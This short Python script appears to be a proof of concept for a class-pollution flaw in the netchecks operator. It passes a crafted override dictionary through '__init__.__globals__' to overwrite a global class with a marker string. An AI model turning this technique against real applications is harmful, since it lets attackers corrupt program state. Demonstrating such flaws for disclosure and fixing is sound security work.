from netchecks_operator.main import *
from kubernetes import client
labels = get_common_labels("test")
container = client.V1Container(
    name="netcheck",
    image=f"{settings.probe.image.repository}:{settings.probe.image.tag}",
    image_pull_policy=settings.probe.image.pullPolicy,
    env=[
    ],
)
pod_template = client.V1PodTemplateSpec(
    metadata=client.V1ObjectMeta(annotations=settings.probe.podAnnotations),
    spec=client.V1PodSpec(
        restart_policy="Never",
        containers=[container],
    ),
)
dst_obj = pod_template
apply_overrides(dst_obj, {'__init__': {'__globals__': {'V1PodTemplateSpec': 'polluted'}}})
print(dst_obj.__init__.__globals__["V1PodTemplateSpec"])
